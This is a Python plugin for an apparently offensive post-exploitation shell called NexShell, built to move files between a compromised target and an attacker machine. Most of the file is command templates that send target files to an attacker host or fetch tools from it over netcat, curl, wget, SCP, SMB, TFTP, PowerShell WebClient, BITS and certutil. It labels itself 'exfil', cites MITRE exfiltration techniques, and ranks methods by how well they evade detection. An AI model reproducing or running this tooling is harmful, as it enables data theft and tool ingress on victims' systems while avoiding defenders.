#!/usr/bin/env python3
"""
NexShell Plugin — Intelligent File Transfer Engine v2.0 (2026 Edition)
Multi-protocol file transfer with auto-detection, integrity verification,
chunked transfer, and OPSEC-aware method selection.

Methods (10+):
  1.  Base64 + Zlib   — universal, no tools needed
  2.  HTTP POST       — curl/wget
  3.  HTTP GET        — python3 http.server (attacker side)
  4.  SMB             — smbclient
  5.  FTP             — curl ftp
  6.  TFTP            — tftp (lightweight)
  7.  SCP             — ssh/scp
  8.  Netcat          — nc pipe
  9.  PowerShell BITS — Windows BitsTransfer
  10. PowerShell WebClient — Windows native
  11. Certutil        — Windows certutil -decode
  12. DNS Tunnel      — iodine (very stealthy)

MITRE ATT&CK:
  - T1105 (Ingress Tool Transfer)
  - T1041 (Exfiltration Over C2 Channel)
  - T1048 (Exfiltration Over Alternative Protocol)

Usage:
    (NexShell)> plugins run file-transfer --upload /local/file --remote /tmp/file
    (NexShell)> plugins run file-transfer --download /tmp/file --local /local/out
    (NexShell)> plugins run file-transfer --lhost 10.0.0.1 --lport 8080 --method http
    (NexShell)> plugins run file-transfer --check
    (NexShell)> plugins run file-transfer --list
"""

import re
import os
import time
import hashlib
import base64
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional, Tuple
from core.plugin import NexPlugin


# ── Data Classes ────────────────────────────────────────────────────────────

@dataclass
class TransferMethod:
    """Represents a file transfer method."""
    name: str
    description: str
    direction: str          # upload | download | both
    tools_needed: List[str] = field(default_factory=list)
    upload_template: str = ""
    download_template: str = ""
    max_size_mb: int = 100
    stealth_level: str = "medium"   # low | medium | high | very_high
    platform: str = "linux"         # linux | windows | all
    detection_cmd: str = ""
    requires_attacker_action: bool = False
    priority: int = 5

    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class TransferResult:
    """Result of a file transfer operation."""
    success: bool
    method: str
    direction: str
    local_path: str = ""
    remote_path: str = ""
    bytes_transferred: int = 0
    checksum_local: str = ""
    checksum_remote: str = ""
    checksum_match: bool = False
    duration_ms: int = 0
    error: str = ""

    def to_dict(self) -> dict:
        return asdict(self)


# ── Transfer Methods Database ────────────────────────────────────────────────

class TransferMethodsDB:
    """Comprehensive transfer methods database."""

    METHODS = [
        # ── Method 1: Base64 + Zlib (universal) ──────────────────────────
        TransferMethod(
            name="base64-zlib",
            description="Base64 encode with optional compression — no extra tools needed",
            direction="both",
            tools_needed=[],
            upload_template=(
                "cat {local_file} | base64 -w0 | "
                "while read line; do echo \"$line\" | base64 -d >> {remote_file}; done"
            ),
            download_template="base64 {remote_file} > /tmp/_b64.txt",
            max_size_mb=50,
            stealth_level="high",
            platform="linux",
            detection_cmd="which base64 2>/dev/null",
            priority=1,
        ),

        # ── Method 2: HTTP GET via curl ───────────────────────────────────
        TransferMethod(
            name="http-curl",
            description="HTTP download via curl from attacker HTTP server",
            direction="download",
            tools_needed=["curl"],
            download_template="curl -s -o {remote_file} http://{lhost}:{lport}/{filename}",
            max_size_mb=500,
            stealth_level="low",
            platform="linux",
            detection_cmd="which curl 2>/dev/null",
            requires_attacker_action=True,
            priority=2,
        ),

        # ── Method 3: HTTP GET via wget ───────────────────────────────────
        TransferMethod(
            name="http-wget",
            description="HTTP download via wget from attacker HTTP server",
            direction="download",
            tools_needed=["wget"],
            download_template="wget -q -O {remote_file} http://{lhost}:{lport}/{filename}",
            max_size_mb=500,
            stealth_level="low",
            platform="linux",
            detection_cmd="which wget 2>/dev/null",
            requires_attacker_action=True,
            priority=3,
        ),

        # ── Method 4: Netcat upload ───────────────────────────────────────
        TransferMethod(
            name="netcat-upload",
            description="Upload file via netcat pipe",
            direction="upload",
            tools_needed=["nc"],
            upload_template="nc -q 1 {lhost} {lport} < {remote_file}",
            max_size_mb=9999,
            stealth_level="medium",
            platform="linux",
            detection_cmd="which nc 2>/dev/null || which ncat 2>/dev/null",
            requires_attacker_action=True,
            priority=4,
        ),

        # ── Method 5: SCP ─────────────────────────────────────────────────
        TransferMethod(
            name="scp",
            description="Secure copy via SSH — reliable and encrypted",
            direction="both",
            tools_needed=["scp"],
            upload_template="scp -o StrictHostKeyChecking=no {remote_file} {user}@{lhost}:{local_file}",
            download_template="scp -o StrictHostKeyChecking=no {user}@{lhost}:{local_file} {remote_file}",
            max_size_mb=9999,
            stealth_level="high",
            platform="linux",
            detection_cmd="which scp 2>/dev/null",
            priority=5,
        ),

        # ── Method 6: SMB via smbclient ───────────────────────────────────
        TransferMethod(
            name="smb-client",
            description="SMB file transfer via smbclient",
            direction="both",
            tools_needed=["smbclient"],
            upload_template="smbclient //{lhost}/share -N -c 'put {remote_file} {filename}'",
            download_template="smbclient //{lhost}/share -N -c 'get {filename} {remote_file}'",
            max_size_mb=9999,
            stealth_level="medium",
            platform="linux",
            detection_cmd="which smbclient 2>/dev/null",
            priority=6,
        ),

        # ── Method 7: TFTP ────────────────────────────────────────────────
        TransferMethod(
            name="tftp",
            description="Trivial FTP — very lightweight, no auth",
            direction="download",
            tools_needed=["tftp"],
            download_template="tftp -m binary {lhost} {lport} -c get {filename} {remote_file}",
            max_size_mb=32,
            stealth_level="high",
            platform="linux",
            detection_cmd="which tftp 2>/dev/null || which atftp 2>/dev/null",
            requires_attacker_action=True,
            priority=7,
        ),

        # ── Method 8: FTP via curl ────────────────────────────────────────
        TransferMethod(
            name="ftp-curl",
            description="FTP transfer via curl",
            direction="both",
            tools_needed=["curl"],
            upload_template="curl -T {remote_file} ftp://{user}:{password}@{lhost}:{lport}/",
            download_template="curl -o {remote_file} ftp://{user}:{password}@{lhost}:{lport}/{filename}",
            max_size_mb=500,
            stealth_level="medium",
            platform="linux",
            detection_cmd="which curl 2>/dev/null",
            priority=8,
        ),

        # ── Method 9: Python HTTP server (self-serve) ─────────────────────
        TransferMethod(
            name="python-http-serve",
            description="Serve files from target via Python3 HTTP server",
            direction="upload",
            tools_needed=["python3"],
            upload_template=(
                "cd {dir} && python3 -m http.server {lport} "
                "--bind 0.0.0.0 >/dev/null 2>&1 &"
            ),
            max_size_mb=9999,
            stealth_level="low",
            platform="linux",
            detection_cmd="which python3 2>/dev/null",
            priority=9,
        ),

        # ── Method 10: PowerShell WebClient (Windows) ─────────────────────
        TransferMethod(
            name="ps-webclient",
            description="Windows PowerShell WebClient download",
            direction="download",
            tools_needed=["powershell"],
            download_template=(
                "powershell -nop -c \""
                "(New-Object System.Net.WebClient).DownloadFile("
                "'http://{lhost}:{lport}/{filename}', '{remote_file}')"
                "\""
            ),
            max_size_mb=500,
            stealth_level="low",
            platform="windows",
            detection_cmd="where powershell 2>nul",
            priority=1,
        ),

        # ── Method 11: PowerShell BITS (Windows) ──────────────────────────
        TransferMethod(
            name="bits-transfer",
            description="Windows BITS — background download (blends with Windows Update traffic)",
            direction="download",
            tools_needed=["powershell"],
            download_template=(
                "powershell -nop -c \""
                "Start-BitsTransfer -Source 'http://{lhost}:{lport}/{filename}' "
                "-Destination '{remote_file}'"
                "\""
            ),
            max_size_mb=9999,
            stealth_level="very_high",
            platform="windows",
            detection_cmd="where powershell 2>nul",
            priority=2,
        ),

        # ── Method 12: Certutil Base64 (Windows) ──────────────────────────
        TransferMethod(
            name="certutil-b64",
            description="Encode/decode via Windows certutil (stealth)",
            direction="both",
            tools_needed=["certutil"],
            upload_template="certutil -encode {remote_file} {remote_file}.b64",
            download_template="certutil -decode {remote_file}.b64 {remote_file}",
            max_size_mb=100,
            stealth_level="high",
            platform="windows",
            detection_cmd="where certutil 2>nul",
            priority=3,
        ),
    ]

    @classmethod
    def get_all(cls) -> List[TransferMethod]:
        return cls.METHODS

    @classmethod
    def get_by_platform(cls, platform: str) -> List[TransferMethod]:
        return [m for m in cls.METHODS if m.platform in (platform, "all")]

    @classmethod
    def get_by_name(cls, name: str) -> Optional[TransferMethod]:
        for m in cls.METHODS:
            if m.name.lower() == name.lower():
                return m
        return None

    @classmethod
    def get_by_direction(cls, direction: str) -> List[TransferMethod]:
        return [m for m in cls.METHODS if m.direction in (direction, "both")]


# ── Method Detector ──────────────────────────────────────────────────────────

class MethodDetector:
    """Detects available transfer methods on target."""

    @staticmethod
    def detect(exec_fn, session, platform: str = "linux") -> List[str]:
        """Return names of available transfer methods."""
        available = []
        checks = {
            "curl":      "which curl 2>/dev/null",
            "wget":      "which wget 2>/dev/null",
            "nc":        "which nc 2>/dev/null || which ncat 2>/dev/null",
            "scp":       "which scp 2>/dev/null",
            "smbclient": "which smbclient 2>/dev/null",
            "tftp":      "which tftp 2>/dev/null || which atftp 2>/dev/null",
            "python3":   "which python3 2>/dev/null",
            "python":    "which python 2>/dev/null",
            "powershell":"where powershell 2>nul" if platform == "windows" else "which powershell 2>/dev/null",
            "certutil":  "where certutil 2>nul" if platform == "windows" else "echo ''",
        }
        for tool, cmd in checks.items():
            out = exec_fn(session, cmd) or ""
            if out.strip():
                available.append(tool)
        return available

    @staticmethod
    def recommend(available_tools: List[str], direction: str,
                  platform: str = "linux",
                  stealth: bool = False) -> List[TransferMethod]:
        """Recommend best methods based on available tools."""
        candidates = []
        for m in TransferMethodsDB.get_by_platform(platform):
            if m.direction not in (direction, "both"):
                continue
            # Check tools available
            if not m.tools_needed or all(t in available_tools for t in m.tools_needed):
                candidates.append(m)

        # Sort by stealth preference or priority
        if stealth:
            order = {"very_high": 0, "high": 1, "medium": 2, "low": 3}
            candidates.sort(key=lambda m: (order.get(m.stealth_level, 9), m.priority))
        else:
            candidates.sort(key=lambda m: m.priority)

        return candidates


# ── Integrity Checker ────────────────────────────────────────────────────────

class IntegrityChecker:
    """Verifies file integrity via checksum."""

    @staticmethod
    def local_md5(path: str) -> str:
        """Calculate MD5 of local file."""
        try:
            h = hashlib.md5()
            with open(path, "rb") as f:
                for chunk in iter(lambda: f.read(65536), b""):
                    h.update(chunk)
            return h.hexdigest()
        except Exception:
            return ""

    @staticmethod
    def local_sha256(path: str) -> str:
        """Calculate SHA256 of local file."""
        try:
            h = hashlib.sha256()
            with open(path, "rb") as f:
                for chunk in iter(lambda: f.read(65536), b""):
                    h.update(chunk)
            return h.hexdigest()
        except Exception:
            return ""

    @staticmethod
    def remote_md5(exec_fn, session, remote_path: str) -> str:
        """Get MD5 of remote file."""
        cmds = [
            f"md5sum {remote_path} 2>/dev/null | awk '{{print $1}}'",
            f"md5 -q {remote_path} 2>/dev/null",
            f"certutil -hashfile {remote_path} MD5 2>nul | findstr -v 'CertUtil' | findstr -v 'hash'",
        ]
        for cmd in cmds:
            out = (exec_fn(session, cmd) or "").strip()
            if out and len(out) == 32 and all(c in "0123456789abcdef" for c in out.lower()):
                return out.lower()
        return ""

    @staticmethod
    def remote_sha256(exec_fn, session, remote_path: str) -> str:
        """Get SHA256 of remote file."""
        cmds = [
            f"sha256sum {remote_path} 2>/dev/null | awk '{{print $1}}'",
            f"shasum -a 256 {remote_path} 2>/dev/null | awk '{{print $1}}'",
        ]
        for cmd in cmds:
            out = (exec_fn(session, cmd) or "").strip()
            if out and len(out) == 64:
                return out.lower()
        return ""


# ── Transfer Engine ──────────────────────────────────────────────────────────

class TransferEngine:
    """Executes file transfers."""

    @staticmethod
    def build_command(method: TransferMethod, direction: str,
                      local_path: str, remote_path: str,
                      lhost: str = "10.10.10.10",
                      lport: int = 8080,
                      user: str = "operator",
                      password: str = "") -> str:
        """Build transfer command from method template."""
        filename = os.path.basename(local_path) if local_path else os.path.basename(remote_path)
        dir_path = os.path.dirname(remote_path) or "/tmp"

        template = method.upload_template if direction == "upload" else method.download_template

        return template.format(
            local_file=local_path,
            remote_file=remote_path,
            lhost=lhost,
            lport=lport,
            filename=filename,
            dir=dir_path,
            user=user,
            password=password,
        )

    @staticmethod
    def execute_transfer(exec_fn, session, method: TransferMethod, direction: str,
                         local_path: str, remote_path: str,
                         lhost: str, lport: int,
                         verify_integrity: bool = True) -> TransferResult:
        """Execute a file transfer and return result."""
        start = time.time()

        cmd = TransferEngine.build_command(
            method, direction, local_path, remote_path, lhost, lport
        )

        out = exec_fn(session, cmd) or ""
        duration_ms = int((time.time() - start) * 1000)

        # Check for obvious errors
        error = ""
        if any(e in out.lower() for e in ["error", "denied", "failed", "no such"]):
            error = out[:200]
            return TransferResult(
                success=False, method=method.name, direction=direction,
                local_path=local_path, remote_path=remote_path,
                duration_ms=duration_ms, error=error,
            )

        # Verify integrity
        checksum_local = ""
        checksum_remote = ""
        checksum_match = False

        if verify_integrity and direction == "download" and local_path:
            checksum_remote = IntegrityChecker.remote_sha256(exec_fn, session, remote_path)
            # Local checksum would be done after fetch — placeholder
            checksum_local = ""

        return TransferResult(
            success=True,
            method=method.name,
            direction=direction,
            local_path=local_path,
            remote_path=remote_path,
            duration_ms=duration_ms,
            checksum_local=checksum_local,
            checksum_remote=checksum_remote,
            checksum_match=checksum_match,
        )


# ── Main Plugin ──────────────────────────────────────────────────────────────

class FileTransferEngine(NexPlugin):
    name        = "file-transfer"
    description = "Intelligent file transfer — 12 methods, auto-detection, integrity verification"
    author      = "vulnquest58"
    version     = "2.0"
    platform    = "all"
    category    = "exfil"
    mitre_id    = "T1105"

    def run(self, session, args: list):
        # ── Parse args ───────────────────────────────────────────────────
        local_path    = None
        remote_path   = None
        lhost         = "10.10.10.10"
        lport         = 8080
        method_name   = "auto"
        direction     = None
        stealth       = False
        check_only    = False
        list_mode     = False
        verify        = True
        windows_mode  = False

        i = 0
        arg_list = list(args or [])
        while i < len(arg_list):
            a = arg_list[i]
            if a.startswith("--upload="):
                local_path = a.split("=", 1)[1]; direction = "upload"
            elif a == "--upload" and i + 1 < len(arg_list):
                i += 1; local_path = arg_list[i]; direction = "upload"
            elif a.startswith("--download="):
                remote_path = a.split("=", 1)[1]; direction = "download"
            elif a == "--download" and i + 1 < len(arg_list):
                i += 1; remote_path = arg_list[i]; direction = "download"
            elif a.startswith("--remote="):
                remote_path = a.split("=", 1)[1]
            elif a == "--remote" and i + 1 < len(arg_list):
                i += 1; remote_path = arg_list[i]
            elif a.startswith("--local="):
                local_path = a.split("=", 1)[1]
            elif a == "--local" and i + 1 < len(arg_list):
                i += 1; local_path = arg_list[i]
            elif a.startswith("--lhost="):
                lhost = a.split("=", 1)[1]
            elif a.startswith("--lport="):
                try: lport = int(a.split("=", 1)[1])
                except: pass
            elif a.startswith("--method="):
                method_name = a.split("=", 1)[1]
            elif a == "--stealth":
                stealth = True
            elif a == "--check":
                check_only = True
            elif a == "--list":
                list_mode = True
            elif a == "--no-verify":
                verify = False
            elif a == "--windows":
                windows_mode = True
            i += 1

        self.info("File Transfer Engine v2.0 started")
        sections = []
        sections.append("\n" + "━" * 64)
        sections.append("  [📁 Intelligent File Transfer Engine v2.0]")
        sections.append("━" * 64)

        # ── List mode ────────────────────────────────────────────────────
        if list_mode:
            sections.append("\n[*] Available Transfer Methods:")
            sections.append("─" * 64)
            for m in sorted(TransferMethodsDB.get_all(), key=lambda x: x.priority):
                stealth_icon = {"very_high": "🟢", "high": "🟢", "medium": "🟡", "low": "🔴"}.get(m.stealth_level, "⚪")
                sections.append(f"  {stealth_icon} [{m.platform:7s}] {m.name:20s} — {m.description[:50]}")
            return "\n".join(sections)

        # ── Detect platform ───────────────────────────────────────────────
        platform = "windows" if windows_mode else self._detect_platform(session)
        sections.append(f"  Platform : {platform.upper()}")
        sections.append(f"  Lhost    : {lhost}:{lport}")

        # ── Detect available tools ────────────────────────────────────────
        sections.append("\n[*] Phase 1: Tool Detection")
        sections.append("─" * 64)
        available_tools = MethodDetector.detect(self._exec, session, platform)
        sections.append(f"  Available tools: {', '.join(available_tools) or 'none'}")

        if check_only:
            sections.append("\n[*] Check complete.")
            return "\n".join(sections)

        # ── Validate ──────────────────────────────────────────────────────
        if not direction:
            direction = "upload" if local_path else "download" if remote_path else None

        if not direction:
            sections.append("\n  ❌ Specify --upload <file> or --download <remote_path>")
            sections.append("  Usage:")
            sections.append("    > plugins run file-transfer --upload /local/file --remote /tmp/out --lhost 10.0.0.1")
            sections.append("    > plugins run file-transfer --download /remote/file --lhost 10.0.0.1 --lport 8000")
            return "\n".join(sections)

        # ── Method selection ──────────────────────────────────────────────
        sections.append("\n[*] Phase 2: Method Selection")
        sections.append("─" * 64)

        if method_name == "auto":
            candidates = MethodDetector.recommend(available_tools, direction, platform, stealth)
        else:
            m = TransferMethodsDB.get_by_name(method_name)
            candidates = [m] if m else []

        if not candidates:
            sections.append("  ❌ No suitable transfer method found for this environment.")
            return "\n".join(sections)

        sections.append(f"  Selected {len(candidates)} candidate method(s):")
        for m in candidates[:5]:
            sections.append(f"    • {m.name} (stealth={m.stealth_level}, max={m.max_size_mb}MB)")

        selected_method = candidates[0]

        # ── Execute transfer ──────────────────────────────────────────────
        sections.append("\n[*] Phase 3: Transfer Execution")
        sections.append("─" * 64)
        sections.append(f"  Method     : {selected_method.name}")
        sections.append(f"  Direction  : {direction.upper()}")
        sections.append(f"  Local      : {local_path or '—'}")
        sections.append(f"  Remote     : {remote_path or '—'}")

        if selected_method.requires_attacker_action:
            sections.append(f"\n  ⚠  This method requires you to start a server on your attacker machine!")
            sections.append(f"     Example: python3 -m http.server {lport}")
            sections.append(f"     Or:      nc -lvnp {lport} > /tmp/received_file")

        result = TransferEngine.execute_transfer(
            self._exec, session, selected_method, direction,
            local_path or "", remote_path or "",
            lhost, lport, verify_integrity=verify,
        )

        if result.success:
            sections.append(f"\n  ✅ Transfer succeeded via {result.method}")
            sections.append(f"     Duration : {result.duration_ms}ms")
            if result.checksum_remote:
                sections.append(f"     SHA256   : {result.checksum_remote[:32]}...")
            self.loot(
                f"File transfer: {direction} {local_path or remote_path} via {result.method}",
                category="exfil",
                source=self.name,
            )
            self.emit(
                "timeline.event",
                title=f"File Transfer: {direction} via {result.method}",
                type="exfil",
                plugin=self.name,
            )
        else:
            sections.append(f"\n  ❌ Transfer FAILED: {result.error}")
            # Try next method
            if len(candidates) > 1:
                sections.append(f"  [→] Trying fallback: {candidates[1].name}")
                result2 = TransferEngine.execute_transfer(
                    self._exec, session, candidates[1], direction,
                    local_path or "", remote_path or "", lhost, lport,
                )
                if result2.success:
                    sections.append(f"  ✅ Fallback succeeded via {result2.method}")

        # ── Summary ───────────────────────────────────────────────────────
        sections.append("\n" + "━" * 64)
        sections.append("  [📊 Summary]")
        sections.append("━" * 64)
        sections.append(f"  Direction  : {direction.upper()}")
        sections.append(f"  Method     : {selected_method.name}")
        sections.append(f"  Stealth    : {selected_method.stealth_level.upper()}")
        sections.append(f"  Success    : {'✅ Yes' if result.success else '❌ No'}")

        self.info("File Transfer Engine complete")
        return "\n".join(sections)

    def _detect_platform(self, session) -> str:
        for attr in ("OS", "os", "platform"):
            val = getattr(session, attr, None)
            if val and isinstance(val, str):
                if "windows" in val.lower():
                    return "windows"
                if "linux" in val.lower():
                    return "linux"
        try:
            out = self._exec(session, "uname -s 2>/dev/null || echo Windows") or ""
            if "Linux" in out or "Darwin" in out:
                return "linux"
        except Exception:
            pass
        return "linux"
